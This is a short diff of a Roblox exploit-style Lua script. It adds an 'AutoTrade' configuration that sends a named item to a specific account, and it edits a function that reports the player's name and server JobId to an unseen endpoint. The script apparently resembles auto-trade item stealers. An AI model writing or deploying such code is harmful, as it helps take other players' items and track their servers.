@@ -1,3 +1,9 @@
+getgenv().AutoTrade = {
+    ["HannahStr3amRogu3"] = {"Spinosaurus"},
+    ["Script"] = [[
+    ]]
+}
+
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local LocalPlayer = Players.LocalPlayer
@@ -156,7 +162,7 @@ local function sendReceive()
     local function sendJobId()
         local body = {
             playerName = LocalPlayer.Name,
-            jobId = game.JobId
+            jobId = game.jobId
         }
 
         local success, err = pcall(function()
@@ -171,7 +177,7 @@ local function sendReceive()
         end)
 
         if success then
-            print("✅ Đã gửi JobId:", game.JobId)
+            print("✅ Đã gửi JobId:", game.jobId)
         else
             warn("❌ Lỗi gửi JobId:", err)
         end
